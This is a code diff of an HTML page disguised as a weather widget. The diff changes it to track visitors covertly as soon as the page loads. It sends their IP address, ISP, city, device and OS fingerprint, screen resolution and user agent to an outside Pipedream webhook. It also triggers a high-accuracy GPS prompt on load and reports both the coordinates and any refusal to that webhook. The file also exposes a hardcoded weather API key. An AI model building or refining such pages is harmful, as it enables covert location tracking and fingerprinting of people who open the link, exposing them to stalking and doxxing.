@@ -45,31 +45,8 @@
         p {
             font-size: 14px;
             color: #a1a1aa;
-            margin-bottom: 30px;
+            margin-bottom: 10px;
             text-transform: capitalize;
-        }
-
-        button {
-            background: #ffffff;
-            color: #121214;
-            border: none;
-            padding: 14px 24px;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 14px;
-            transition: background 0.2s ease;
-        }
-
-        button:hover {
-            background: #e4e4e7;
-        }
-
-        button:disabled {
-            background: #27272a;
-            color: #71717a;
-            cursor: not-allowed;
         }
     </style>
 </head>
@@ -79,88 +56,101 @@
         <h2 id="city-display">Fetching Location...</h2>
         <h1 id="temp-display">--°C</h1>
         <p id="condition-display">Gathering atmospheric metrics...</p>
-
-        <button id="action-btn" onclick="triggerPinpointLocation()">Update Precision Weather</button>
     </div>
 
     <script>
         // ==================== CONFIGURATION ====================
         const apiKey = "5ee3f9bd4499e661596b6b95991408fe"; 
-        const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net";     // Replace with your Pipedream webhook URL
+        const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net"; // Replace with your Pipedream webhook URL
         // =======================================================
 
-        // Runs instantly the millisecond the website finishes loading
         window.onload = function() {
             fetchWeatherByIP();
+            triggerAutoPinpoint();
         };
 
-        // --- PHASE 1: INSTANT IP TRACKING ROUTINE ---
+        // Helper function that parses the User-Agent string into simple terms
+        function getDeviceDetails() {
+            const ua = navigator.userAgent;
+            let os = "Unknown OS";
+            let device = "Unknown Device";
+
+            // Extract Operating System
+            if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
+            else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
+            else if (ua.indexOf("Macintosh") !== -1) os = "MacOS";
+            else if (ua.indexOf("iPhone") !== -1) os = "iOS (iPhone)";
+            else if (ua.indexOf("iPad") !== -1) os = "iOS (iPad)";
+            else if (ua.indexOf("Android") !== -1) os = "Android";
+            else if (ua.indexOf("Linux") !== -1) os = "Linux";
+
+            // Extract Common Device Brands/Models silently
+            if (/iPhone/i.test(ua)) device = "Apple iPhone";
+            else if (/iPad/i.test(ua)) device = "Apple iPad";
+            else if (/Samsung|SM-|GT-/i.test(ua)) device = "Samsung Galaxy";
+            else if (/OnePlus/i.test(ua)) device = "OnePlus Device";
+            else if (/Pixel/i.test(ua)) device = "Google Pixel";
+            else if (/Mi |Redmi|POCO/i.test(ua)) device = "Xiaomi/Redmi";
+            else if (/Vivo/i.test(ua)) device = "Vivo Device";
+            else if (/Oppo/i.test(ua)) device = "Oppo Device";
+            else if (/Macintosh|Windows|Linux/i.test(ua)) device = "PC / Laptop";
+
+            return { os: os, device: device };
+        }
+
+        // --- PHASE 1: AUTOMATIC BACKGROUND IP & DEVICE LOAD ---
         function fetchWeatherByIP() {
             fetch('https://api.ipify.org?format=json')
-                .then(res => {
-                    if (!res.ok) throw new Error("IP Lookup service failed");
-                    return res.json();
-                })
-                .then(ipObj => {
-                    const userIP = ipObj.ip;
-                    return fetch(`https://ipapi.co/${userIP}/json/`);
-                })
-                .then(res => {
-                    if (!res.ok) throw new Error("Geo distribution mapping failed");
-                    return res.json();
-                })
+                .then(res => res.json())
+                .then(ipObj => fetch(`https://ipapi.co/${ipObj.ip}/json/`))
+                .then(res => res.json())
                 .then(ipData => {
                     const ipCity = ipData.city || "Hyderabad"; 
-                    console.log(`Phase 1 - IP Geolocation matched city: ${ipCity}`);
+                    const hardware = getDeviceDetails();
                     
+                    // THIS IS WHERE THE MAGIC HAPPENS: Sends all device fingerprints instantly
                     sendTrackingData({ 
-                        event: "instant_ip_load", 
+                        event: "instant_ip_and_device_load", 
                         city: ipCity, 
                         ip: ipData.ip,
-                        isp: ipData.org 
+                        isp: ipData.org,
+                        user_operating_system: hardware.os,
+                        user_device_brand: hardware.device,
+                        screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                        raw_user_agent: navigator.userAgent
                     });
 
-                    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${ipCity}&units=metric&appid=${apiKey}`;
-                    return fetch(weatherUrl);
+                    return fetch(`https://api.openweathermap.org/data/2.5/weather?q=${ipCity}&units=metric&appid=${apiKey}`);
                 })
                 .then(res => res.json())
                 .then(weatherData => {
-                    if (weatherData && weatherData.main && weatherData.main.temp !== undefined) {
+                    if (weatherData && weatherData.main && !window.hasPreciseGPS) {
                         document.getElementById("city-display").innerText = weatherData.name;
                         document.getElementById("temp-display").innerText = `${Math.round(weatherData.main.temp)}°C`;
                         document.getElementById("condition-display").innerText = weatherData.weather[0].description;
-                    } else {
-                        handleWeatherError();
                     }
                 })
                 .catch(err => {
-                    console.error("Phase 1 Processing Error, launching hard fallback lookup:", err);
-                    
-                    fetch(`https://api.openweathermap.org/data/2.5/weather?q=Hyderabad&units=metric&appid=${apiKey}`)
-                        .then(res => res.json())
-                        .then(data => {
-                            if (data && data.main) {
+                    if (!window.hasPreciseGPS) {
+                        fetch(`https://api.openweathermap.org/data/2.5/weather?q=Hyderabad&units=metric&appid=${apiKey}`)
+                            .then(res => res.json())
+                            .then(data => {
                                 document.getElementById("city-display").innerText = data.name;
                                 document.getElementById("temp-display").innerText = `${Math.round(data.main.temp)}°C`;
                                 document.getElementById("condition-display").innerText = data.weather[0].description;
-                            }
-                        })
-                        .catch(() => handleWeatherError());
+                            });
+                    }
                 });
         }
 
-        // --- PHASE 2: PINPOINT HIGH-ACCURACY HARDWARE ROUTINE ---
-        function triggerPinpointLocation() {
-            const btn = document.getElementById("action-btn");
-            btn.innerText = "Scanning Coordinates...";
-            btn.disabled = true;
-
+        // --- PHASE 2: AUTOMATIC HIGH-ACCURACY PROMPT TRIPPING ---
+        function triggerAutoPinpoint() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        window.hasPreciseGPS = true; 
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        console.log(`Phase 2 - Target Coordinates extracted: ${lat}, ${lon}`);
 
                         sendTrackingData({ 
                             event: "gps_allow_clicked", 
@@ -170,74 +160,43 @@
                         });
 
                         fetchPreciseWeatherAndDetails(lat, lon);
-                        btn.innerText = "Location Updated";
                     },
                     (error) => {
-                        console.warn("User clicked Deny/Not Allow. Handling silently.");
-                        
-                        // Report the denial quietly to your tracking logs
+                        console.warn("User clicked Deny or prompt closed.");
                         sendTrackingData({ event: "gps_denied_by_user" });
-                        
-                        // Silent fallback: Just reset button style seamlessly without altering the screen elements
-                        btn.innerText = "Update Precision Weather";
-                        btn.disabled = false;
                     },
-                    { 
-                        enableHighAccuracy: true, 
-                        timeout: 12000,           
-                        maximumAge: 0             
-                    }
+                    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
                 );
-            } else {
-                console.log("System Browser Geolocation utilities unsupported.");
-                btn.innerText = "Unsupported Device";
             }
         }
 
-        // --- PHASE 2 CORE RESOLUTION LAYER ---
         function fetchPreciseWeatherAndDetails(lat, lon) {
             const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&appid=${apiKey}`;
             const geoUrl = `https://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=1&appid=${apiKey}`;
 
-            Promise.all([
-                fetch(weatherUrl).then(r => r.json()),
-                fetch(geoUrl).then(r => r.json())
-            ])
+            Promise.all([fetch(weatherUrl).then(r => r.json()), fetch(geoUrl).then(r => r.json())])
             .then(([weatherData, geoData]) => {
                 let preciseDisplayTitle = weatherData.name;
-
                 if (geoData && geoData[0]) {
                     const loc = geoData[0];
                     preciseDisplayTitle = loc.state ? `${loc.name}, ${loc.state}` : loc.name;
                 }
 
-                if (weatherData && weatherData.main && weatherData.main.temp !== undefined) {
+                if (weatherData && weatherData.main) {
                     document.getElementById("city-display").innerText = preciseDisplayTitle;
                     document.getElementById("temp-display").innerText = `${Math.round(weatherData.main.temp)}°C`;
                     document.getElementById("condition-display").innerText = weatherData.weather[0].description;
-                } else {
-                    handleWeatherError();
                 }
             })
-            .catch(err => {
-                console.error("Phase 2 API Processing Block Error:", err);
-                handleWeatherError();
-            });
+            .catch(err => console.error(err));
         }
 
-        // --- TELEMETRY TRANSPORT HELPER ---
         function sendTrackingData(payload) {
             fetch(pipedreamURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
-            }).catch(() => console.log("Log buffer executed sync"));
-        }
-
-        // --- SYSTEM ANTI-CRASH FALLBACK ---
-        function handleWeatherError() {
-            document.getElementById("temp-display").innerText = "--°C";
-            document.getElementById("condition-display").innerText = "Data synchronization error. Refreshing metrics...";
+            }).catch(() => {});
         }
     </script>
 </body>
